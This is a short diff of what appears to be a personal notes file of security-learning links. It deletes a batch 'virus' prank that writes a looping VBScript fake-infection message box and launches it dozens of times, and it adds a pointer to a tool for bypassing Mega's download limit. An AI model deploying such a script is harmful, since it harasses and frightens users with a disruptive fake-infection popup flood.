@@ -24,46 +24,12 @@ Over the wire bandit help / tutorial - https://www.youtube.com/watch?v=PRAjBlys-
 https://www.computer.org/cms/CYBSI/docs/Top-10-Flaws.pdf
 
 Delme Virus:
-@ echo off
-rem ---------------------------------
-rem Spam With VBScript Msgboxes
-echo Do>>msgbox.vbs
-echo x=msgbox("Your computer is infected with a virus!",0+48,"Infected") >>msgbox.vbs
-echo Loop>>msgbox.vbs
-start "" "msgbox.vbs"
-start "" "msgbox.vbs"
-start "" "msgbox.vbs"
-start "" "msgbox.vbs"
-start "" "msgbox.vbs"
-start "" "msgbox.vbs"
-start "" "msgbox.vbs"
-start "" "msgbox.vbs"
-start "" "msgbox.vbs"
-start "" "msgbox.vbs"
-start "" "msgbox.vbs"
-start "" "msgbox.vbs"
-start "" "msgbox.vbs"
-start "" "msgbox.vbs"
-start "" "msgbox.vbs"
-start "" "msgbox.vbs"
-start "" "msgbox.vbs"
-start "" "msgbox.vbs"
-start "" "msgbox.vbs"
-start "" "msgbox.vbs"
-start "" "msgbox.vbs"
-start "" "msgbox.vbs"
-start "" "msgbox.vbs"
-start "" "msgbox.vbs"
-start "" "msgbox.vbs"
-start "" "msgbox.vbs"
-start "" "msgbox.vbs"
-rem ---------------------------------
 
-
-rem  __-Virus Author: -__
+Mega Bastard : To download from Mega bypassing the Mega download limit use Mega Bastard
+https://github.com/tonikelope/megabasterd
 
 Kali Linux Module One:
-https://drive.google.com/open?id=1CjQG-htNQJN7oac4Iw1ArkrdqHLzVdZu
+https://mega.nz/#F!1sxXWILY!eOPqeuAeruHYvthrHaM1gA
 
 IEEE - Archive
 https://www.computer.org/cms/CYBSI/docs/Top-10-Flaws.pdf
